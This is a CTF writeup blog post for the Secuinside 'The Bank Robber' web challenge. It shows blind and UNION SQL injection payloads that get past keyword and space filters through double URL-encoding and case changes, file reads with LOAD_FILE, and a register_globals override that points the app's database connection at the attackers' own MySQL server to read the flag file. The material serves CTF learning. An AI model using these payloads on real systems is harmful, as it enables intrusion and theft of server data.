---
title: secuinside ctf web The Bank Robber writeup
author: slipper
layout: post
permalink: /secuinside-ctf-web-the-bank-robber-writeup/
categories:
  - Uncategorized
---
## The Bank Robber

This is an excelent challenge. Thanks for the awesome CTF.

We waste a lot of time in dealing with the SQL injection part.

We found the SQL injection vulnerability in `./M.list` .

The server use mod_rewrite to modify the incoming URL request. It seems that the sever split the URL by `'.'`.

The SQL query is

        select * from hacked_list where $column like '%$word%' order by time desc;
    

When we GET `./M.list.idx.1`, it was translated to the query

        select * from hacked_list where idx like '%1%' order by time desc;
    

The $word is quoted, but idx seems to be not filtered.

`GET ./M.list.idx&lt;30--.1` returns 29 results.

At first, we use %23(&#8216;#&#8217;) to comment out the rest part of the query. But it seems useless. (We are not familiar with mod_rewrite&#8230;) Later, we found &#8216;&#8211;&#8217; took effect because &#8216;-&#8217; won&#8217;t be escaped.

`GET ./M.list.idx&lt;=(select ascii(substring(user(),1,1)))-80--.1` </br>

We use blind injection to get some useless information such as user(), database(), version()&#8230;

But we don&#8217;t know how to query the information_schema database to get more information about the database structure, because the `'.'` is used as the split point in the URL.

Moreover, We don&#8217;t know how to use `order by 1` or `and 1=1` to gain deeper information about this injection. We thought the $column is strictly filtered.. We were confused then.

Flanker accidently found that `./M.list.id%2bx.1` returns normal page. I fell deep in thought.

I realized that the URL was unescaped twice (it is evident if I were familiar with mod_rewrite) and filtered space(`' '`). The transformation is `'%2b' =&gt; '+' =&gt; ' ' =&gt; ''`

Then I knew how to use `'.'` in the query and what&#8217;s wrong with the `order by` and other clauses.

I use `'%252e'` to represent `'.'` and `'%252f%252a%252a%252f'('/**/')` to represent `'<br /><br />
'`. (In fact, `'/**/'` is also effective)

`order by` is filtered to `orderby`, but `order/**/by` is effective.

I found `order/**/by/**/1` returns normal page, but `order/**/by/**/2` returns empty page, so there was only one column in the SQL query.

But it went wrong when I constructed a &#8216;union select&#8217; query. Then I found &#8216;union&#8217;, &#8216;select&#8217; and &#8216;from&#8217; was filtered.

GET `'./M.idx=1-select-.1'` Normal

GET `'./M.idx=1-union-.1'` Normal

GET `'./M.idx=1-from-.1'` Normal

GET `'./M.idx=1-unselection-.1'` Normal

GET `'./M.idx=1-selunionect-.1'` Empty

GET `'./M.idx=1-frunselectionom-.1'` Normal

GET `'./M.idx=1-   frunselectionom-.1'` Normal

so the filter function might be

>> replace &#8216;select&#8217; to &#8221; in $column

>> replace &#8216;union&#8217; to &#8221; in $column

>> replace &#8216;from&#8217; to &#8221; in $column

>> replace &#8216; &#8216; to &#8221; in $column

It was easy to find that `'Select', 'Union', 'From'` were not filtered.

So I use

    http://1.234.27.139:61080/M.list.1=2%252f%252a%252a%252fUnion%252f%252a%252a%252fSelect%252f%252a%252a%252f1,column_name,3,4%252f%252a%252a%252fFrom%252f%252a%252a%252finformation_schema%252ecolumns%252f%252a%252a%252fwhere%252f%252a%252a%252ftable_name=0x6861636b65645f6c697374--.a
    

to view all the information in the database.

We were stucked soon. Because there was nothing special in the database.

But we found we could load files from the server. The only way to go on was to use load&#95;file() to read files from server. (load&#95;file() is also filtered so we use Load_File())

Having tried many filenames, Flanker (again~) found the the `'/site/.htaccess'` is readable. So we could get some special information in source code.

The HINT showed that the flag was in `'/var/lib/php5/FLAG'`, we could read the file through the vulnerability in the source code.

     45 if (!ini_get("register_globals")) extract($_GET);
     ...
     47 include_once $_BHVAR['path_lib']."database.php";
     48 include_once $_BHVAR['path_module']."_system/functions.php";
     ...
     64 $head = $_BHVAR['path_layout'].get_layout($_skin, 'head');
     ...
     67 echo file_get_contents($head);
     ...
     70     case "P" : echo file_get_contents($_BHVAR['path_page']."/".$_act."/_main.php"); break;
     71     case "M" : include_once $_BHVAR['path_module']."/".$_act."/_main.php"; break;
    

get_layout() was defined in `'./modules/_system/functions.php'`

     10  function get_layout($layout, $pos){
     11     $result = mysql_query("select path from _BH_layout where layout_name='$layout' and position='$pos'");
     12     $row = mysql_fetch_array($result);
     13     if (!isset($row['path'])){
     14         if ($pos = 'head'){
     15             return "./reverted/h.htm";
     16         } else {
     17             return "./reverted/f.htm";
     18         }
     19     }
     20     return $row['path'];
     21  }
    

In line 45, we could register variables in $_GET, but it was escaped.

In line 70/71, we could read/include files, but we could not truncate the suffix `'/_main.php'`.

Since we could register globals, we could modify some variable such as `$_BHVAR`.

The database connection settings were stored in `./lib/database.php`. If we change the $&#95;BHVAR['path&#95;lib'], the `./lib/database.php` could not be included correctly, we could use our own mysql server to answer the query.

Then we create a table for this challenge. Thanks aay for offerring vps.

     create table _BH_layout(path varchar(50), layout_name varchar(50), position varchar(50));
     insert _BH_layout values('../../../../../var/lib/php5/FLAG', '1', 'head');
    
    http://1.234.27.139:61080/Main_Site/TBR.php?_type=P&_skin=1&_BHVAR[path_module]=./modules/&_BHVAR[db][host]=50.115.47.187&_BHVAR[db][user]=BH&_BHVAR[db][pass]=BHBH&_BHVAR[db][name]=BH
    
    

key is&#8230; @*Y0UR&#95;EY3&#95;LEE_SIN*@